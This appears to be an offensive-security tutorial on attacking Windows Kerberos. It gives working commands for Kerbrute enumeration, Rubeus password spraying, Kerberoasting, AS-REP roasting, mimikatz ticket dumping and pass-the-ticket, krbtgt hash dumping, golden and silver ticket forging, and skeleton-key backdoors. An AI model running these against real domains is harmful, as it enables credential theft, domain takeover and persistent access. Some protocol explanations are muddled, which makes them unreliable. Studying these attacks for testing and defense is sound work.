This document will cover all the basics of attacking kerberos the windows ticket-granting service; we will cover the following:
	1. Initial enumeration using tools like Kerbrute and Rubeus
    2. Kerberoasting
    3. AS-REP Roasting with Rubeus and Impacket
    4. Golden/Silver Ticket Attacks
    5. Pass the Ticket
    6. Skeleton key attacks using mimikatz

    What is Kerberos?
    	-> Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

	Common Terminology -
		1. Ticket Granting Ticket (TGT): A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.

        2. Key Distribution Center (KDC):  The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.

        3. Authentication Service (AS): The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.

        4. Ticket Granting Service (TGS): The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.

        5. Service Principal Name (SPN): A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.

        6. KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.

        7. Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.

        8. Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.

        9. Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.

        10. Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.


    AS-REQ w/ Pre-Authentication In Detail - 
        The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

        Ticket Granting Ticket Contents - 
            In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

        Service Ticket Contents - 
            To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

                1. Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
                2. User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

    Kerberos Authentication Overviews:
        AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

        AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

        TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access. 

        TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

        AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

        AP-REP - 6.) The service grants access

    Kerberos Tickets Overview:
        The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. 
        Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

    Attack Privilege Requirements -

        Kerbrute Enumeration - No domain access required 
        Pass the Ticket - Access as a user to the domain required
        Kerberoasting - Access as any user required
        AS-REP Roasting - Access as any user required
        Golden Ticket - Full domain compromise (domain admin) required 
        Silver Ticket - Service hash required 
        Skeleton Key - Full domain compromise (domain admin) required



Enumeration w/ Kerbrute
    Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.
    
    Note: You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you

    Abusing Pre-Authentication Overview - 
        By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

    Kerbrute Installation - 

        1.) Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases

        2.) Rename kerbrute_linux_amd64 to kerbrute

        3.) chmod +x kerbrute - make kerbrute executable        

    Enumerating Users w/ Kerbrute -
        kerbrute userenum --dc <dc-name> -d <domain> <user wordlist>



Harvesting & BruteForcing Tickets w/ Rubeus
    Note: For this attack, you need to have admin privileges on domain Controller

    -> Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and  developed by HarmJ0y the very well known active directory guru.
    
    -> Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

    Tool link - https://github.com/GhostPack/Rubeus

    Harvesting Tickets w/ Rubeus
        >Rubeus.exe harvest /interval:30 - This command tells Rubeus to harvest for TGTs every 30 secs.

    Brute-Forcing / Password-Spraying w/ Rubeus
        Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

        This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

        Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file.
            >echo 10.10.221.174 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

            >Rubeus.exe brute /password:Password1 /noticket -> This will take a given password and "spray" it against all found users then give .kirbi TGT for that user. 


Kerberoasting w/ Rebeus and Impacket
    -> Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.

    -> To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain.

    Kerberoasting w/ Rebeus:
        >Rubeus.exe kerberoast

    Kerberoasting w/ Impacket
        >GetUserSPNs.py <domain>/username:password -dc-ip <ip> -request -  this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

    Cracking hashes with hashcat/John
        >hashcat -m 13100 -a 0 hash.txt Pass.txt

AS-REP Roasting w/ Rebeus
    -> Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

    -> There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.

    AS-REP Roasting Overview:
        During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

    Dumping KRBASREP5 Hashes w/ Rubeus
        >Rubeues.exe asreproast

    Cracking hashes with hashcat/john
        1. Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User....
        >hashcat -m 18200 hash.txt Pass.txt

    As-REP Roasting Mitigations:   
        -> Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective.
        -> Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.



Pass the ticket w/ Mimikatz:
    -> Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory

    Overview:
        -> Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided
        -> You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory.
        -> This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around.
        -> The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin.
        -> You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

    Prepare Mimikatz and Dump Tickets:
        Note: You will need to run the command prompt as an administrator.

        >mimikatz.exe - run mimikatz
        
        >privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz.
        
        >sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in.

        Note: When looking for which ticket to impersonate I would recommend looking for an administrator ticket.

    Pass the Ticket w/ Mimikatz
        -> Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.

        >kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket.

        >klist - Here we are just verfiying that we successfully impersonated the ticket by listing our cached tickets.

    Pass the ticket mitigation:
        -> Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

Golden/Silver Ticket Attacks w/ mimikatz:
    
    -> A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. 
    -> The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

    -> A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

    KRBTGT Overview:
        -> In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients
        -> If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want.
        -> A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

    Golden/Silver Ticket Attack Overview:
        -> A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket.
        -> This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

    Dumping krbtgt hash:
        >mimikatz.exe
        >privilege::debug
        >lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a golden ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as SQLService account.

    Create a Golden/Silver Ticket:
        >kerberos::golden /user:Administrator /domain:controller.local /sid:<sid> /krbtgt:<hash> /id:<id>
            -> This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

    USe the Golden/Silver Ticket to access other machines:
        >misc:cmd - this will open a new elevated command prompt with the given ticket in mimikatz.

        Note: Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.


kerberos Backdoors w/ Mimikatz:
    
    Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.

    The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

    The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

    Skeleton Key Overview:

        The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

    Preparing Mimikatz:
        >mimikatz.exe
        >privilege::debug

    Installing the Skeleton key w/ mimikatz:
        >misc::skeleton

    Accessing the forest:
        -> The default credentials will be: "mimikatz"
        example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password
        example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

        Note: The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques.


Resources:

    1. https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
    2. https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
    3. https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
    4. https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
    5. https://www.varonis.com/blog/kerberos-authentication-explained/
    6. https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
    7. https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
    8. https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf

